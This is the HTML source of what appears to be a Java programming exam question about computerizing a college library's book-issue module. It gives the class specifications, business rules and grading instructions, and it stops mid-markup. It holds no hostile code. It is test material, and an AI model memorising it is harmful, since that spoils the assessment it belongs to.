<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Case Study &amp; Discussion<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Knowledge Level<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\" style=\"text-align:justify;tab-stops:117.0pt\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">K3<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n</tbody></table>\r\n\r\n</div><p class=\"MsoNormal\" style=\"text-align:justify\"><b><u><span style=\"font-size:\r\n12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><br></span></u></b></p><p class=\"MsoNormal\" style=\"text-align:justify\"><b><u><span style=\"font-size:\r\n12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Instructions to Students:</span></u></b></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\">Read the Problem Description carefully and understand the Scenario and\r\nClass Diagram.<b><u><o:p></o:p></u></b></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"margin-left:.75in;mso-add-space:\r\nauto;text-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\">2.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\">Read the implementation details and understand the requirements you need\r\nto implement.<b><u><o:p></o:p></u></b></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpLast\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1;mso-bidi-font-weight:bold\">3.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp;</span></span><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\">Library.java file contains all the necessary classes and the classes are\r\npartially coded to implement the given scenario.</span></p><p class=\"MsoListParagraphCxSpLast\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\"><b><u><o:p></o:p></u></b></span></p></div><div align=\"center\"><p class=\"MsoNormal\" style=\"text-align:justify\"><b><u><span style=\"font-size:\r\n12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Guidelines:</span></u></b></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">You should only code your program at the space\r\nmentioned as “//Replace Your Code”.<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"margin-left:.75in;mso-add-space:\r\nauto;text-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\">2.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">Your Code should satisfy the requirements specified\r\nin the Implementation Details.<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpLast\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:\r\nbold\">3.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">Don’t add additional methods in any class.</span></p><p class=\"MsoListParagraphCxSpLast\" style=\"margin-left:.75in;mso-add-space:auto;\r\ntext-align:justify;text-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\"><o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align:justify\"><b><span style=\"font-size:12.0pt;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">NOTE: NOT adhering to the above\r\ninstructions and guidelines may lead to drastic reduction in your score even if\r\nthe code is executing without any errors<o:p></o:p></span></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align:justify\"><b><u><span style=\"font-size:\r\n12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Problem Description:</span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align:justify\"><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">Karpagam Institute of\r\nTechnology is incepted with the vision of providing cutting edge technical\r\neducation and to create proficient engineers. Karpagam Institute of Technology\r\nhas a Central Library with 50000 Volumes including Books and Journals. 2000\r\nstudents and 200 Faculty Members are using the Library for Reference and to\r\nenhance their knowledge.Now Management of the institution decided to\r\ncomputerize the Central library to manage the Library transaction for improving\r\nreliability and simplicity. As part of it, now we are developing a Module to\r\nmaintain book issue details.</span></em><b><span style=\"font-size:12.0pt;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp; </span></b></p><p class=\"MsoNormal\" style=\"text-align: left; \"><em><b><u><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">Business\r\nRules:</span></u></b></em></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; margin-left: 0.75in; text-indent: -0.25in;\"><!--[if !supportLists]--><em><span style=\"font-size:12.0pt;color:black;mso-themecolor:text1\">1.<span style=\"font-style: normal; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span></em><!--[endif]--><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">Any Member of Library could\r\nonly avail specified number of books (E.g. 5) at a time.<o:p></o:p></span></em></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left;\"><em style=\"text-indent: -0.25in;\"><span style=\"font-size:12.0pt;color:black;mso-themecolor:text1\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2.<span style=\"font-style: normal; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span></em><em style=\"text-indent: -0.25in;\"><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">A Book can be availed by\r\nonly one member at a time.</span></em><b><span style=\"font-size:12.0pt;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp; </span></b></p><p class=\"MsoNormal\" style=\"text-align: left;\"><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\">Our Module should satisfy the above requirements along\r\nwith the functional requirements to achieve reliability.</span></em></p><p class=\"MsoNormal\" style=\"text-align: left;\"><img src=\"/media/django-summernote/2022-07-27/04594700-2de2-47fc-b86c-b20e79ba753a.png\" style=\"width: 442px;\"><em><span style=\"font-size: 12pt; color: black; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><br></span></em><b><span style=\"font-size:12.0pt;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;</span></b><b style=\"text-align: justify;\"><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Rules:</span></u></b></p><p class=\"MsoListParagraph\" style=\"text-align:justify;text-indent:-.25in;\r\nmso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:bold\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp; <span style=\"font-size: 12pt;\">1.</span>&nbsp;&nbsp;</span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">Don’t add additional instance variable in the given\r\nclass.</span></p><p class=\"MsoListParagraph\" style=\"text-align:justify;text-indent:-.25in;\r\nmso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\"><o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"margin-right:1.0in;text-align:justify\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;2.</span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"><span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Do Type conversions wherever it is necessary.</span></p><p class=\"MsoListParagraph\" style=\"text-align:justify;text-indent:-.25in;\r\nmso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\"><o:p></o:p></span></p><p class=\"MsoNormal\" style=\"margin-right:1.0in;text-align:justify\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;3.&nbsp;</span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"><span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Don’t make change in the Library Class.</span></p><p class=\"MsoNormal\" style=\"text-align:justify\"><b><u><span style=\"font-size:\r\n12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Implementation Details:</span></u></b><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Member Class</span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This Class Contains Constructor to initialize the Data\r\nMembers <b>MemberID</b>, <b>MemberName</b> and&nbsp;<b>MemberType</b>.</span><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p class=\"MsoListParagraph\" style=\"text-align: left; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp;&nbsp;</span></span><span style=\"color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px;\">Ø</span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\"><span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This Class contains Getter Method for all the Instance\r\nMembers.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Book Class<o:p></o:p></span></u></b></p><p class=\"MsoListParagraph\" style=\"text-align: left; text-indent: -0.25in;\">\r\n\r\n</p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">This Class is coded already for you.</span></u></b></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\"><o:p></o:p></span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This Method is a Constructor Method to initialize the <b>BookId</b>, <b>Title, Publisher</b>, <b>Author</b>\r\nand <b>Edition</b>.</span></p><p class=\"MsoListParagraph\" style=\"text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Use Super class Constructor to initialize the super class\r\ndata members <b>BookId</b>, <b>Title</b> and <b>Publisher</b>.</span></p><p class=\"MsoListParagraph\" style=\"text-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\"><o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Journal Class<o:p></o:p></span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left;\"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">This Class Inherits the Class Book</span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; \"><b><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Journal(String,int,int) method:</span></b><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp;</span><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"> <span style=\"color:black;mso-themecolor:\r\ntext1\"><o:p></o:p></span></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This Method is a Constructor Method to initialize <b>BookId</b>, <b>Title</b>, <b>Publisher</b>, <b>Editor</b>, <b>Volume</b> and <b>Issue</b>.</span><br></p>\r\n\r\n<p class=\"MsoListParagraphCxSpLast\" style=\"text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Use Super class Constructor to initialize the super class\r\ndata members <b>BookId</b>, <b>Title</b> and <b>Publisher</b>.</span></p><p class=\"MsoListParagraphCxSpLast\" style=\"text-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\"><o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; \"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">LibraryDb Class</span></u></b></p><p class=\"MsoNormal\" style=\"text-align: left;\"><b><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">ValidateMemberEligibility(int):int method:</span></b></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;</span></span><b><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">Issuebook(int,int):void method:</span></b></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;font-family:Wingdings;mso-fareast-font-family:Wingdings;\r\nmso-bidi-font-family:Wingdings;color:black;mso-themecolor:text1\">&nbsp; Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">This method accepts <b>Memberid</b>\r\nof a member and <b>Bookid</b> of a Book.</span></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp;</span></span><span style=\"color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px;\">Ø</span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\"><span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method finds the <b>index</b> of <b>Memberid</b> in the\r\n<b>Members[]</b> array through linear\r\nsearch.</span></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Symbol; color: black;\">·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Symbol; color: black;\">·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">Then, find the Number of Books taken by the\r\nmember using the same <b>index</b> in the <b>Bookstaken[]</b> array.</span></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Symbol; color: black;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">If it is 5 then return 1, else return 0;</span></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align: left; text-indent: -0.25in;\"><span style=\"text-indent: -0.25in; font-size: 12pt; color: black;\"><font face=\"Wingdings\">Ø</font><span style=\"font-family: &quot;Times New Roman&quot;; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal;\">&nbsp; &nbsp; &nbsp;</span></span><span style=\"color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px;\">Ø</span><span style=\"text-indent: -0.25in; font-size: 12pt; color: black;\"><span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal;\"><font face=\"Wingdings\">&nbsp;</font></span></span><span style=\"text-indent: -0.25in; color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">If the </span><b style=\"text-indent: -0.25in; color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Memberid</b><span style=\"text-indent: -0.25in; color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">\r\nis not find in the </span><b style=\"text-indent: -0.25in; color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Members[]</b><span style=\"text-indent: -0.25in; color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\"> array,\r\nthen return 0.&nbsp;</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><b><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;\r\nmso-themecolor:text1\">VaidateBookAvailability(int):int method:</span></b></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -24px; color: rgb(0, 0, 0); font-family: Wingdings; font-size: 16px;\">Ø</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">&nbsp;This method accepts </span><b style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">Bookid</b><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">\r\nof a book.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Wingdings; color: black;\">Ø<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; </span></span><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: black;\">This method finds the <b>index</b> of B<b>ookid</b> in the <b>Books[]</b> array through linear search.</span></p><p class=\"MsoNormal\" style=\"text-align: left; \"><span style=\"text-indent: -0.25in; font-size: 12pt; font-family: Symbol; color: black;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><span style=\"text-indent: -0.25in; font-size: 12pt; 